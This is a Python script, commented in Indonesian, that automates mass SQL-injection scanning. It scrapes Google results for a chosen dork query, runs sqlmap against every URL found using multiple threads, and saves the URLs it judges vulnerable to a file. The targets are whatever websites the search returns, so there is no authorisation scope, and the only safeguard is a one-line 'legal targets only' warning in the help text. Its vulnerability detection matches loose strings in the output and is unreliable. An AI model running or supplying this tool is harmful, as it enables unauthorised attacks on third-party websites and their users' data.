#!/usr/bin/env python3
import requests
import subprocess
import logging
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

class GoogleDorker:
    def __init__(self, dork, sqlmap_dir="sqlmap-master", output_file="output.txt", threads=3, pages=1):
        self.dork = dork
        self.sqlmap_dir = sqlmap_dir
        self.output_file = output_file
        self.threads = threads
        self.pages = pages
        self.results = []
        self._setup_logger()

    def _setup_logger(self):
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s [%(levelname)s] %(message)s",
            handlers=[logging.StreamHandler(), logging.FileHandler("dorker.log")]
        )

    def fetch_results(self):
        """Cari hasil Google dengan dork"""
        headers = {"User-Agent": "Mozilla/5.0"}
        for page in range(self.pages):
            start = page * 10
            url = f"https://www.google.com/search?q={self.dork}&start={start}"
            logging.info(f"[DORK] Fetching: {url}")
            r = requests.get(url, headers=headers)
            soup = BeautifulSoup(r.text, "html.parser")

            for a in soup.find_all("a", href=True):
                href = a["href"]
                if href.startswith("/url?q="):
                    real_url = href.split("/url?q=")[1].split("&")[0]
                    self.results.append(real_url)
            time.sleep(2)  # biar ga terlalu agresif

        logging.info(f"[DORK] Total hasil: {len(self.results)}")
        return self.results

    def run_sqlmap(self, url):
        """Jalankan sqlmap pada 1 URL"""
        cmd = [
            "python3", "sqlmap.py",
            "-u", url,
            "--batch",
            "--random-agent",
            "--level=2",
            "--risk=1"
        ]
        try:
            result = subprocess.run(
                cmd,
                cwd=self.sqlmap_dir,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            output = result.stdout.lower()

            if "sql injection" in output or "parameter" in output:
                logging.info(f"[VULN] {url}")
                return url, True
            else:
                logging.info(f"[SAFE] {url}")
                return url, False
        except Exception as e:
            logging.error(f"Error: {e}")
            return url, False

    def run_all(self):
        """Loop semua URL pakai multithreading"""
        vuln_urls = []
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_url = {executor.submit(self.run_sqlmap, url): url for url in self.results}
            for future in as_completed(future_to_url):
                url, is_vuln = future.result()
                if is_vuln:
                    vuln_urls.append(url)

        if vuln_urls:
            with open(self.output_file, "w") as f:
                for u in vuln_urls:
                    f.write(u + "\n")
            logging.info(f"[+] {len(vuln_urls)} vuln URL disimpan ke {self.output_file}")
        else:
            logging.info("[+] Tidak ada vuln ditemukan.")


def main():
    parser = argparse.ArgumentParser(description="Google Dork + SQLMap Otomatis (WARNING: gunakan hanya di target legal!)")
    parser.add_argument("-q", "--query", required=True, help="Google Dork query")
    parser.add_argument("-o", "--output", default="output.txt", help="File output URL vuln")
    parser.add_argument("-d", "--dir", default="sqlmap-master", help="Direktori sqlmap-master")
    parser.add_argument("-t", "--threads", type=int, default=3, help="Jumlah threads")
    parser.add_argument("-p", "--pages", type=int, default=1, help="Jumlah halaman hasil Google")
    args = parser.parse_args()

    dorker = GoogleDorker(args.query, sqlmap_dir=args.dir, output_file=args.output, threads=args.threads, pages=args.pages)
    dorker.fetch_results()
    dorker.run_all()


if __name__ == "__main__":
    main()
